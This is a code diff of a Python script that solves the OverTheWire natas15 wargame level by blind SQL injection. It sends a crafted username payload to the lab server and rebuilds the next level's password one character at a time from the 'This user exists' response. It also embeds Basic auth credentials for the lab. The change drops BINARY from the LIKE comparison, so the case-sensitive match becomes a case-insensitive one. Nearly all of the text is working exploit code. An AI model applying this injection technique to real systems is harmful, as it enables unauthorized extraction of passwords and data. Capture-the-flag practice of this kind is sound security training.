@@ -6,11 +6,11 @@ pw='' #String to store the found correct password characters
 c=0 #Number of correct password characters found
 while c<32:
 	for i in chars:
-		val= 'natas16" and password LIKE BINARY "'+pw+i+'%"; #' #SQL payload
+		val= 'natas16" and password like "'+pw+i+'%"; #' #SQL payload
 		dat={'username':val}
 		req=requests.post('http://natas15.natas.labs.overthewire.org/index.php',data=dat,auth=auth,headers={"Authorization":"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="})
 		if "This user exists" in str(req.content):
-			pw=pw+i
+			pw+=i
 			print(pw)
 			c+=1
-print(pw)
+print("Password: "+pw)
